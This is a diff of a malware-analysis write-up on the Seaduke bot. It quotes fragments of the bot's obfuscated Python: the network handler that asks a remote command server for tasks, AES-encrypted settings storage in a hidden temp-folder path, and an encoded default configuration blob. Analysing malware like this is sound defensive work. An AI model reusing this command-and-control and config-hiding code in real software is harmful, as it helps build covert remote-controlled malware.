@@ -1,11 +1,9 @@
 # 3) fetch tasks with networkhandler
-ask `networkHandleKlass` to get tasks:
+`main()` asks `networkHandleKlass` to get tasks:
 ```python
 def main():
     ...
-    while 1:
-        ...
-        networkTasks=networkHandleKlass.get_tasks()
+    networkTasks=networkHandleKlass.get_tasks()
 
 
 class NetworkHandlerKlass(object):
@@ -81,7 +79,7 @@ class NetworkHandlerKlass(object):
                         return networkTasks
 ```
 ## request information from remote server
-at this point, botKlass requests and receives instructions with `NetworkHandlerKlass.__send_request` method:
+this is a critical part since it is where botKlass requests and receives instructions with `NetworkHandlerKlass.__send_request` method:
 ```python
 response_data=self.__send_request(id=botKlass.bot_id)
 
@@ -142,23 +140,60 @@ since `self.__url=None`, we look at `botKlass.current_host`.
 class BotKlass(object):
 
     def __init__(self):
-        self.__settings=self.__load_settings()
+        self.__settings = self.__load_settings()
     
     @property
     def current_host(self):
         return self.__settings['host_scripts'][self.__current_host_index]
 ```
-
-# STOP
-
-then it decodes tasks
+this calls the following:
 ```python
-decoded_response = self.decode_data(response_data)
+class BotKlass(object):
+    ...
+    def __load_settings(self):
+        settings_file_path = self.settings_file_path
+        d = {}  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQeD replaced to d
+        if not os_path.exists(settings_file_path):
+            d = get_default_settings()
+        else:
+            try:
+                with open(settings_file_path,'rb')as settings_file:
+                    bot_settings = get_default_settings()
+                    v_crypto_aes_key = bot_settings['keys']['aes']
+                    v_crypto_aes_iv = bot_settings['keys']['aes_iv']
+                    c = CryptoKlass(v_crypto_aes_key,v_crypto_aes_iv)
+                    k = c.decrypt(settings_file.read())
+                    d = json_loads(k)
+            except Exception as e:
+                pass
+                os_remove(settings_file_path)
+                d = get_default_settings()
+        return d
 ```
-then, only if it receives tasks from at least one instruction will it view it as an official task:
+this calls the following for `settings_file_path`:
 ```python
-for networkTask in decoded_tasks:
-    if 'task_data' in networkTask and networkTask['task_data']:
-        networkTask['task_data'] = my_cryptoklass.decode_data(networkTask['task_data'])
-        networkTasks.append(networkTask)
+class BotKlass(object):
+    ...
+    @property
+    def settings_file_path(self):
+        key_id = get_default_settings()['key_id']
+        if v_sys_platform.startswith('win'):
+            w='tmp' + key_id.lower()
+        else:
+            w='.'+key_id
+        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=tempfile_gettempdir()
+        if v_sys_platform.startswith('win'):
+            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD=ctypes.windll.shell32.SHGetFolderPathW
+            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD.argtypes=[ctypes.wintypes.HWND,ctypes.c_int,ctypes.wintypes.HANDLE,ctypes.wintypes.DWORD,ctypes.wintypes.LPCWSTR]
+            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ=ctypes.wintypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
+            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD(0,0x1C,0,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ)
+            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ.value
+        return os_path.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy, w)
+```
+which calls `get_default_settings()`, which returns a [dict called `bot_settings`](https://github.com/mynameisvinn/Seaduke/blob/master/bot_settings).md:
+```python
+bot_settings=json_loads(zlib_decompress(base64_b64decode('eJx1kF1PwjAUhv/K0iuNpiUMg8Fw4QSTAfFrQQ3GNN12Nua2dpyWj0n877ZAvPOqzTnP+77nnD3JCtSG41ryFCrRkoHXufRICa223z0R4F4yDb/i7wVb7NLx1XTUfVf6fRXG4xTvdq1fr0ZRNHub9IP70ldDYvVWxouNUyYVzKdhcVHfvkbTWbf/2Juw+fNwSH4ctjaqUiLlGowpZH7MhB1wKWpw8pnKlZyH1NYOvk3zX8uODwa4yAygbWei0uAylsrupxMsGuPsP8jSmGbAWK1kYRRS3UqaSIZa02bZkE8rQcgADy4HWFt6u93STCQQK1XSRNXMRa41IBc5SOPQqDAQCGQ+9em1dxZYshZYehHgBvDGO+Vqi8UCqcKcnZPjrXmROoenXvCweOm4IkgRV3ab04H+FvoFdgWNdw==')))
+
+def get_default_settings():
+    return bot_settings
 ```
